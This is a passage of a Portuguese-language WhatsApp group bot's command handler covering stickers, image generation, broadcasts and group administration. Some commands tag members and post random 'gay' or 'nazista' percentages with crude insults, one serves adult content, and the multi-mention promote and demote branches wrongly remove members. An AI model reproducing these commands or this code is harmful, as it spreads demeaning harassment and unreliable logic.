					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: 'PRONTINHO AQUI ESTAR SUA PLAQUINHA ✓*\n\n𝙳𝙾𝙽𝙾: JUNHIN'})
					break
			    
			    
			    
			    

				
case 'gay':
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a pessoa')
				mentidn = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                ghost = mek.participant
                const gays =['22','40','45','100','98','99','12','5','0','67','88']
				const ain = gays[Math.floor(Math.random() * gays.length)]
				rate = body.slice(1)		
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		     	 reply(`Fazendo a probabilidades☻`)
				 data = fs.readFileSync('./src/gay.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                buffer = await getBuffer(randKey.result)               
                gay = `*GAY ENCONTRADO!!! *@${mentidn.split('@')[0]}* *SUA PORCETAGEM DE GAY É: ${ain}% bem gay slc*`
                Pin.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: mek, caption: gay, contextInfo: {mentionedJid: [mentidn]}})
				break
case 'amor':
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a pessoa')
				mentidn = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                ghost = mek.participant
                const mor =['22','40','45','100','98','99','12','5','0','67','88']
				const am = mor[Math.floor(Math.random() * mor.length)]
				rate = body.slice(1)		
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		     	 reply(`Fazendo a probabilidades😈`)
				 data = fs.readFileSync('./src/shit.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                buffer = await getBuffer(randKey.result)               
                amor = `${pushname} suas chances de ficar com @${mentidn.split('@')[0]} são de: ${am}%`
                Pin.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: mek, caption: amor, contextInfo: {mentionedJid: [mentidn]}})
				break
				
case 'nazista':
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a pessoa')
				mentidn = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                ghost = mek.participant
                const naz =['22','40','45','100','98','99','12','5','0','67','88']
				const hit = naz[Math.floor(Math.random() * naz.length)]
				rate = body.slice(1)		
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		     	 reply(`Fazendo a probabilidades 🕵️‍♂️🤢`)
				 data = fs.readFileSync('./src/nazis.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                buffer = await getBuffer(randKey.result)               
                hitlhe = `*NAZISTA ENCONTRADO!!! *@${mentidn.split('@')[0]}* *SUA PORCETAGEM DE NAZISTA É: ${hit}% nazista 😳*`
                Pin.sendMessage(from, buffer, image, { quoted: mek, caption: hitlhe, contextInfo: {mentionedJid: [mentidn]}})
				break			

                 
				
case 'hacker':				
case 'hackear':
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a pessoa')
				mentidn = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                ghost = mek.participant
                const hack =['22','40','45','100','98','99','12','5','0','67','88']
				const hac = hack[Math.floor(Math.random() * hack.length)]
				rate = body.slice(1)		
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		     	 reply(`Hackeando o alvo...💻🤓☣`)
				 data = fs.readFileSync('./src/hacker.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                buffer = await getBuffer(randKey.result)               
                hacke = `*ALVO HACKEADO!!!* *👨‍💻 ঔৣ͜͡➳ @${mentidn.split('@')[0]} FOI HACKEADO ${hac}% COM SUCESSO🕵️‍♂️*`
                Pin.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: mek, caption: hacke, contextInfo: {mentionedJid: [mentidn]}})
				break


case 'putaria':
				 Pin.updatePresence(from, Presence.composing) 
				 data = fs.readFileSync('./Fxc7/18.js');
                 jsonData = JSON.parse(data);
                 randIndex = jsonData[Math.floor(Math.random() * (jsonData.length))];
                 randKey = jsonData[randIndex];
                 randBokep = await getBuffer(randKey.image)
                 reply(mess.wait)
                 randTeks = await fetchJson(randKey.teks)
                 Pin.sendMessage(from, randBokep, image, {quoted: mek, caption: randTeks})
				await limitAdd(sender) 
				break





case 'chlogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 8) return reply('O texto é longo, até 8 caracteres')
					reply('*ESTOU PROCESSANDO,SE DER ERRO TENTE NOVAMENTE🦧*')
					buffer = await getBuffer(`https://clutamac.sirv.com/IMG_20210303_050439.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.x=37%25&text.0.position.y=67%25&text.0.size=17&text.0.color=282222`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* JUNHIN'})
					break
					
					
					


case 'texto1':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 9) return reply('O texto é longo, até 9 caracteres ;-;')
					reply('*ESTOU PROCESSANDO,SE DER ERRO TENTE NOVAMENTE🦧*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210223_235608.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=2%25&text.0.size=30&text.0.color=ff0000&text.0.font.weight=600&text.1.text=${teks}&text.1.position.gravity=center&text.1.position.x=1%25&text.1.size=30&text.1.color=ffffff&text.1.font.weight=600&text.1.outline.blur=57`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*JUNHIN CASE:* JUNHIN'})
					break




				
				
				


case 'placa2':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*ESTOU PROCESSANDO,SE DER ERRO TENTE NOVAMENTE🦧*')
					buffer = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?text=${teks}&apikey=apivinz`)
					Pin.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* JUNHIN'})
					break
					
					


					


case 'diabolico':                 
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Pin.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=3:width_type=o:width=50:g=80 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						Pin.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
	       				})
			       	break
			       	
			       	
			       	
			       	
case 'antilink':
				if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('modelo #antilink para ativar')
					if ((args[0]) === 'on') {
						if (isAntiLink) return reply('anti link já on')
						antilink.push(from)
						fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
						reply(`\`\`\`✓“Ativou com sucesso o recurso anti-link no grupo\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						if (!isAntiLink) return reply('anti link já off')
						antilink.splice(from, 1)
						fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
						reply(`\`\`\`✓“Desativando com sucesso o recurso anti-link no grupo\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('on para ligar, desligar para desabilitar')
					}
					break
					
					
					
					
				case 'bemvindo':
				if (isBanned) return reply(mess.only.benned)    
				if (!isUser) return reply(mess.only.userB)
								
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if ((args[0]) === 'on') {
						if (isWelkom) return reply('Udah aktif gan')
						welkom.push(from)
						fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
						reply(`\`\`\`✓“Ativou com sucesso o recurso de boas-vindas no grupo\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						welkom.splice(from, 1)
						fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
						reply(`\`\`\`✓“Desativando com sucesso o recurso de boas-vindas no grupo\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('On ativar, Off para desativar')
					}
					break					
		
					




															
																							
case 'antiracismo':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if ((args[0]) === 'on') {
						if (isAntiRacismo) return reply('O modo antiracismo já está ativo')
						antiracismo.push(from)
						fs.writeFileSync('./database/json/antiracismo.json', JSON.stringify(antiracismo))
						reply(`\`\`\`✓Ativado com sucesso o modo antiracismo no grupo\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						antiracismo.splice(from, 1)
						fs.writeFileSync('./database/json/antiracismo.json', JSON.stringify(antiracismo))
						reply(`\`\`\`✓Modo antiracismo desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('On para ativar, Off para desligar')
					}
					break




					case 'antifake':
					try {
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isAntiFake) return reply('Ja esta ativo')
						antifake.push(from)
						fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))
						reply('Ativou com sucesso o recurso de antifake neste grupo✔️')
					} else if (Number(args[0]) === 0) {
						antifake.splice(from, 1)
						fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))
						reply('Desativou com sucesso o recurso de antifake neste grupo✔️')
					} else {
						reply('1 para ativar, 0 para desativar')
					}
					} catch {
						reply('Deu erro, tente novamente :/')
					}
                break




case 'antipalavrao':
                    if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
                if (args.length < 1) return reply('on para ligar, desligar para desabilitar')
                if (args[0] === 'on') {
                if (isBadWord) return reply('anti palavrão já on')
                 	   badword.push(from)
                 	   fs.writeFileSync('./database/json/badword.json', JSON.stringify(badword))
                  	   reply(`\`\`\`✓“Sukses mengaktifkan fitur anti badword di group\`\`\` *${groupMetadata.subject}*`)
              	  } else if (args[0] === 'off') {
                    	if (!isBadWord) return reply('anti palavrão já off')
                  	  badword.splice(from, 1)
                 	   fs.writeFileSync('./database/json/badword.json', JSON.stringify(badword))
                 	    reply(`\`\`\`✓“Desativando com sucesso o recurso anti-ofensa no grupo\`\`\` *${groupMetadata.subject}*`)
             	   } else {
                 	   reply(ind.satukos())
                	}
                    break
                    
                    
                    
                    
                    case 'do':
                    if (!isOwner) return reply(mess.only.ownerB)
					Pin.deleteMessage(from,{ 
					id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true   
				    })
					break
                    
                    
                    
                    
case 'addpalavra':
                    if (!isOwner) return reply(mess.only.ownerB)
                    if (args.length < 1) return reply( `Enviar pedidos ${prefix}addpalavra [palavras duras]. exemplo ${prefix}addpalavra cuzao`)
                    const bw = body.slice(12)
                    bad.push(bw);
                     fs.writeFileSync('./database/json/bad.json', JSON.stringify(bad))
                    reply('Sucesso em adicionar palavrões!')
                    break




case 'delpalavra':
                    if (!isOwner) return reply(mess.only.ownerB)
                    if (args.length < 1) return reply( `Kirim perintah ${prefix}delbadword [kata kasar]. contoh ${prefix}delbadword bego`)
                    let dbw = body.slice(12)
                    bad.splice(dbw)
                    fs.writeFileSync('./database/json/bad.json', JSON.stringify(bad))
                    reply('Sucesso exclui PALAVRAO!')
                    break 




case 'listpalavra':
                    let lbw = `Esta e uma lista de palavras ruins\nTotal : ${bad.length}\n`
                    for (let i of bad) {
                        lbw += `➸ ${i.replace(bad)}\n`
                    }
                    await reply(lbw)
                    break





case 'perfil':

  if (!isRegister) return reply(mess.only.daftarB)

  try {

ppimg = await Pin.getProfilePicture(`${sender.split('@')[0]}@c.us`)

  } catch {

ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg@'

  }

  teks = `‣ *foto* :👆👆
  
  ‣ *Nama* : ${pushname}

  ‣ *teu numero* : ${sender.split("@")[0]}

  ‣ *Link* : wa.me/${sender.split("@")[0]}`

  its = await getBuffer (ppimg)

  Pin.sendMessage(from, its, image, {

quoted: mek, caption: teks

  })

  

  break

 
   







case 'ytmp4':
					if (args.length < 1) return reply('Cadê o url, hum?')
					if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
					anu = await fetchJson(`https://st4rz.herokuapp.com/api/ytv2?url=${args[0]}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = `*Title* : ${anu.title}`
					thumb = await getBuffer(anu.thumb)
					Pin.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
					buffer = await getBuffer(anu.result)
					Pin.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: mek})
					break
				



//--block user
                case 'listadeblock':
				case 'blocklist':

					teks = '☂︎𓇽𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐂𝐓𝐓 𝐁𝐋𝐎𝐐𝐔𝐄𝐀𝐃𝐎 𝐏𝐄𝐋𝐎 𝐁𝐎𝐓𓇽☂︎ :\n'

					for (let block of blocked) {

						teks += `~> @${block.split('@')[0]}\n`

					}

					teks += `Total : ${blocked.length}`

					Pin.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": blocked}})

					break



//--read text on image

				case 'textodafoto':

					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {

						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek

						const media = await Pin.downloadAndSaveMediaMessage(encmedia)

						reply(mess.wait)

						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})

							.then(teks => {

								reply(teks.trim())

								fs.unlinkSync(media)

							})

							.catch(err => {

								reply(err.message)

								fs.unlinkSync(media)

							})

					} else {

						reply('manda uma ft pra pega o txt dela mankk ')

					}

					break







//--fzr figu
                 case 'figu':
               
               case 'f':
               
                case 'figurinha':
                
				case 'stiker':

				case 'sticker':

				  case 's':

					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {

						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek

						const media = await Pin.downloadAndSaveMediaMessage(encmedia)

						ran = getRandom('.webp')

						await ffmpeg(`./${media}`)

							.input(media)

							.on('start', function (cmd) {

								console.log(`Started : ${cmd}`)

							})

							.on('error', function (err) {

								console.log(`Error : ${err}`)

								fs.unlinkSync(media)

								reply(mess.error.stick)

							})

							.on('end', function () {

								console.log('Finish')

								exec(`webpmux -set exif ${addMetadata('JUN', 'BOT-JUNHIN')} ${ran} -o ${ran}`, async (error) => {

									if (error) return reply(mess.error.stick)

									Pin.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `AQUI ESTÁ A SUA FIGURINHA`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})

									fs.unlinkSync(media)	

									fs.unlinkSync(ran)	

								})

								/*Pin.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})

								fs.unlinkSync(media)

								fs.unlinkSync(ran)*/

							})

							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])

							.toFormat('webp')

							.save(ran)

					} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek

						const media = await Pin.downloadAndSaveMediaMessage(encmedia)

						ran = getRandom('.webp')

						reply(mess.wait)

						await ffmpeg(`./${media}`)

							.inputFormat(media.split('.')[1])

							.on('start', function (cmd) {

								console.log(`Started : ${cmd}`)

							})

							.on('error', function (err) {

								console.log(`Error : ${err}`)

								fs.unlinkSync(media)

								tipe = media.endsWith('.mp4') ? 'video' : 'gif'

								reply(`❌ Falha, no momento da conversão ${tipe} de stiker`)

							})

							.on('end', function () {

								console.log('Finish')

								exec(`webpmux -set exif ${addMetadata('JUNBOT', 'BOT-JUNHIN')} ${ran} -o ${ran}`, async (error) => {

									if (error) return reply(mess.error.stick)

									Pin.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})

									fs.unlinkSync(media)

									fs.unlinkSync(ran)

								})

								Pin.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})

								fs.unlinkSync(media)

								fs.unlinkSync(ran)

							})

							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])

							.toFormat('webp')

							.save(ran)

					} else if ((isMedia || isQuotedImage) && args[0] == 'nobg') {

						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek

						const media = await Pin.downloadAndSaveMediaMessage(encmedia)

						ranw = getRandom('.webp')

						ranp = getRandom('.png')

						reply(mess.wait)

						keyrmbg = 'Your-ApiKey'

						await removeBackgroundFromImageFile({path: media, apiKey: keyrmbg, size: 'auto', type: 'auto', ranp}).then(res => {

							fs.unlinkSync(media)

							let buffer = Buffer.from(res.base64img, 'base64')

							fs.writeFileSync(ranp, buffer, (err) => {

								if (err) return reply('Falha, ocorreu um erro, tente novamente mais tarde.')

							})

							exec(`ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`, (err) => {

								fs.unlinkSync(ranp)

								if (err) return reply(mess.error.stick)

								exec(`webpmux -set exif ${addMetadata('alpin', 'pinbot')} ${ranw} -o ${ranw}`, async (error) => {

									if (error) return reply(mess.error.stick)

									Pin.sendMessage(from, fs.readFileSync(ranw), sticker, {quoted: mek})

									fs.unlinkSync(ranw)

								})

								//Pin.sendMessage(from, fs.readFileSync(ranw), sticker, {quoted: mek})

							})

						})

					} else if ((isMedia || isQuotedImage) && colors.includes(args[0])) {

						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek

						const media = await Pin.downloadAndSaveMediaMessage(encmedia)

						ran = getRandom('.webp')

						await ffmpeg(`./${media}`)

							.on('start', function (cmd) {

								console.log('Started :', cmd)

							})

							.on('error', function (err) {

								fs.unlinkSync(media)

								console.log('Error :', err)

							})

							.on('end', function () {

								console.log('Finish')

								fs.unlinkSync(media)

								Pin.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `AQUI ESTÁ A SUA FIGURINHA`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", 'jpegThumbnail': fs.readFileSync('kk/sticker/botlogo.webp')}}}})
								fs.unlinkSync(ran)

							})

							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=${args[0]}@0.0, split [a][b]; [a] palettegen=reserve_transparent=off; [b][p] paletteuse`])

							.toFormat('webp')

							.save(ran)

					} else {

						reply(`Envie fotos com legendas ${prefix}sticker ou tag de imagem que foi enviado`)

					}

					break





//-- Setting prefix

				case 'setprefix':

					if (args.length < 1) return

					if (!isOwner) return reply(mess.only.ownerB)

				  prefix = args[0]

					up.prefix = prefix

					fs.writeFileSync('./data/settings.json', JSON.stringify(up, null, '\t'))

					reply(`O prefixo foi alterado com sucesso para : ${prefix}`)

					break





case 'block':

  Pin.updatePresence(from, Presence.composing)

  if (!isGroup) return reply(mess.only.group)

  if (!isOwner) return reply(mess.only.ownerB)

  Pin.blockUser (`${body.slice(8)}@c.us`, "add")

  Pin.sendMessage(from, `Números de block, Pedido Recebido @556992482009 seu lindo`, text, {

quoted: mek

  })

  break





case 'unblock':

  if (!isGroup) return reply(mess.only.group)

  if (!isOwner) return reply(mess.only.ownerB)

  Pin.blockUser (`${body.slice(9)}@c.us`, "remove")

  Pin.sendMessage(from, `Desbloquear, Pedido Recebido`, text)

  break




//---marcar membro
                case 'marcar3':
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `ঔৣ͜͡➳ https://wa.me/${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					Pin.sendMessage(from, teks, text, {detectLinks: false, quoted: mek})
					break
					
                case 'marcar2':
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `ঔৣ͜͡➳ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					reply(teks)
					break
                
				case 'marcar':

Pin.updatePresence(from, Presence.composing)

if (!isGroup) return reply(mess.only.group)

if (!isRegister) return reply(mess.only.daftarB)

if (!isGroupAdmins) return reply(mess.only.admin)

members_id = []

teks = (args.length > 1) ? body.slice(8).trim(): ''

teks += `  Total : ${groupMembers.length}\n`

for (let mem of groupMembers) {

  teks += `┃ @${mem.jid.split('@')[0]}\n`

  members_id.push(mem.jid)

}

mentions('〘  *Marcado* 〙\n┏━━━━━━━━━━━━━━━━━━━━\n┠⊷'+teks+'┃━━━━━━━━━━━━━━━━━━━━\n┃────✪ ☂︎𓇽BOT DO 🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™✪────\n┗━━━━━━━━━━━━━━━━━━━━', members_id, true)

break





//clear all chat

				case 'limpachat':

					if (!isOwner) return reply('COMANDO SOMENTE PARA O JUNHIN DA PIKA DE MEL 🥵🥰')

					anu = await Pin.chats.all()

					Pin.setMaxListeners(25)

					for (let _ of anu) {

						Pin.deleteChat(_.jid)

					}

					reply('Sucesso em deletar todo o chat :)')

					break
                case 'hidetag':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
					var value = body.slice(9)
					var group = await Pin.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					Pin.sendMessage(from, options, text)
					break
				case 'bc':
					if (!isOwner) return reply('Quem é você?')
					if (args.length < 1) return reply('.......')
					anu = await Pin.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await Pin.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Pin.sendMessage(_.jid, buff, image, {caption: `[ 𝗧𝗿𝗮𝗻𝘀𝗺𝗶𝘀𝘀𝗮𝗼 𝗱𝗼 🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣 ]\n\n${body.slice(4)}`})
						}
						reply('Transmissao enviada')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `[ 𝙏𝙧𝙖𝙣𝙨𝙢𝙞𝙨𝙨𝙖𝙤 𝙙𝙚 𝙖𝙫𝙞𝙨𝙤 𝙙𝙤 🌙ꪾ〬ꩌ۪ঔৣ͜͡𝙅𝙪𝙣𝙝𝙞𝙣☂︎™ ]\n\n${body.slice(4)}`)
						}
						reply('✔️Tm enviada com sucesso✔️')
					}
					break





      case 'promote':

					if (!isGroup) return reply(mess.only.group)

					if (!isGroupAdmins) return reply(mess.only.admin)

					if (!isBotGroupAdmins) return reply(mess.only.Badmin)

					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return

					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid

					if (mentioned.length > 1) {

						teks = 'pronto estar na posição dos adm,voa mlk🦧\n'

						for (let _ of mentioned) {

							teks += `@${_.split('@')[0]}\n`

						}

						mentions(from, mentioned, true)

						Pin.groupRemove(from, mentioned)

					} else {

						mentions(`kkkk parabéns kkkkk @${mentioned[0].split('@')[0]} carai viro ademarKKKKKK`, mentioned, true)

						Pin.groupMakeAdmin(from, mentioned)

					}

					break




  case 'setname':

if (!isGroup) return reply(mess.only.group)

if (!isGroupAdmins) return reply(mess.only.admin)

if (!isBotGroupAdmins) return reply(mess.only.Badmin)

idgrup = `${from.split("@s.whatsapp.net")[0]}`;

Pin.groupUpdateSubject(idgrup, `${body.slice(9)}`)

Pin.sendMessage(from, '*☉*Renomeando o Grupo', text, {

  quoted: mek

})

break




  case 'setdesk':

if (!isGroup) return reply(mess.only.group)

if (!isGroupAdmins) return reply(mess.only.admin)

if (!isBotGroupAdmins) return reply(mess.only.Badmin)

Pin.groupUpdateDescription(from, `${body.slice(9)}`)

Pin.sendMessage(from, '*☉* Alterar a descrição do grupo', text, {

  quoted: mek

})

break




				case 'demote':

					if (!isGroup) return reply(mess.only.group)

					if (!isGroupAdmins) return reply(mess.only.admin)

					if (!isBotGroupAdmins) return reply(mess.only.Badmin)

					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return

					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid

					if (mentioned.length > 1) {

						teks = 'pronto tirei ele como adm do grupo tropa 😎😎\n'

						for (let _ of mentioned) {

							teks += `@${_.split('@')[0]}\n`

						}

						mentions(teks, mentioned, true)

						Pin.groupRemove(from, mentioned)

					} else {

						mentions(`tirei de ademer tropakkkkkk @${mentioned[0].split('@')[0]} sifudeo KKKKKKKKKKKKK`, mentioned, true)

						Pin.groupDemoteAdmin(from, mentioned)

					}

					break



//--menambah member

				case 'add':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('Você quer adicionar um gênio?')
					if (args[0].startsWith('08')) return reply('Use o código do país, man')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						Pin.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Falha ao adicionar destino, talvez porque é privado')
					}
					break



//--mengeluarkan member
           
                     case 'junhindomina':
			       	case 'remover':

					if (!isGroup) return reply(mess.only.group)

					if (!isOwner) return reply('COMANDO SOMENTE PARA O JUNHIN DA PIKA DE MEL 🥵🥰')

					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target')

					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid

					if (mentioned.length > 1) {

						teks = 'ce fala eu fiz ele que se fode 😎 flw mano ate  :\n'

						for (let _ of mentioned) {

							teks += `@${_.split('@')[0]}\n`

						}

						mentions(teks, mentioned, true)

						Pin.groupRemove(from, mentioned)

					} else {

						mentions(`vai pra casa do krl fdpkkkkkk @${mentioned[0].split('@')[0]}`, mentioned, true)

						Pin.groupRemove(from, mentioned)

					}

					break
		 				 			

				case 'listadmins':

				  case 'listadmin':

				    case 'adminlist':

					if (!isGroup) return reply(mess.only.group)

					teks = `AQUI ESTA AS PUTINHAS ADM GAY DO GRUPO*${groupMetadata.subject}*\nTOTAL GAY : ${groupAdmins.length}\n\n`

